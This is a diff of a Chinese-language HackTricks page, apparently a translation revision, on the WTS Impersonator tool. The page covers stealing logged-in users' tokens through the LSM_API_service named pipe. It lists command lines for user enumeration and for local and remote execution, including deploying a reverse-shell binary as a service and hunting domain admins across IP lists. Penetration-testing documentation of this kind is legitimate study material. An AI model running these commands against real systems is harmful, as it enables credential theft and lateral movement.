@@ -1,26 +1,27 @@
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary>Support HackTricks</summary>
 
-支持HackTricks的其他方式：
-
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-**WTS Impersonator**工具利用**"\\pipe\LSM_API_service"** RPC命名管道，隐蔽地枚举已登录用户并劫持其令牌，绕过传统的令牌模拟技术。这种方法有助于在网络中实现无缝的横向移动。这项技术背后的创新归功于**Omri Baso，其作品可在[GitHub](https://github.com/OmriBaso/WTSImpersonator)**上找到。
+**WTS Impersonator** 工具利用 **"\\pipe\LSM_API_service"** RPC 命名管道，悄悄枚举已登录用户并劫持他们的令牌，绕过传统的令牌模拟技术。这种方法促进了网络内的无缝横向移动。这项技术的创新归功于 **Omri Baso，他的工作可以在 [GitHub](https://github.com/OmriBaso/WTSImpersonator) 上访问**。
 
 ### 核心功能
-该工具通过一系列API调用运行：
+该工具通过一系列 API 调用进行操作：
 ```powershell
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
 ### 关键模块和用法
-- **枚举用户**：使用该工具可以进行本地和远程用户枚举，使用以下命令执行相应场景：
+- **枚举用户**：使用该工具可以进行本地和远程用户枚举，使用适合的命令：
 - 本地：
 ```powershell
 .\WTSImpersonator.exe -m enum
@@ -30,24 +31,40 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → 
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **执行命令**：`exec` 和 `exec-remote` 模块需要**服务**上下文才能运行。本地执行只需 WTSImpersonator 可执行文件和一个命令：
+- **执行命令**：`exec`和`exec-remote`模块需要**服务**上下文才能工作。本地执行只需WTSImpersonator可执行文件和一个命令：
 - 本地命令执行示例：
 ```powershell
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- 可使用 PsExec64.exe 获取服务上下文：
+- PsExec64.exe可用于获取服务上下文：
 ```powershell
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **远程命令执行**：涉及远程创建和安装类似于 PsExec.exe 的服务，允许以适当权限执行。
+- **远程命令执行**：涉及创建和安装一个远程服务，类似于PsExec.exe，允许以适当的权限执行。
 - 远程执行示例：
 ```powershell
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **用户搜索模块**：针对多台机器上的特定用户，以其凭据执行代码。这对于针对在多个系统上具有本地管理员权限的域管理员非常有用。
+- **用户猎杀模块**：针对多个机器上的特定用户，在他们的凭据下执行代码。这对于针对在多个系统上具有本地管理员权限的域管理员特别有用。
 - 用法示例：
 ```powershell
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
+
+
+{% hint style="success" %}
+学习和实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>支持HackTricks</summary>
+
+* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR分享黑客技巧。
+
+</details>
+{% endhint %}
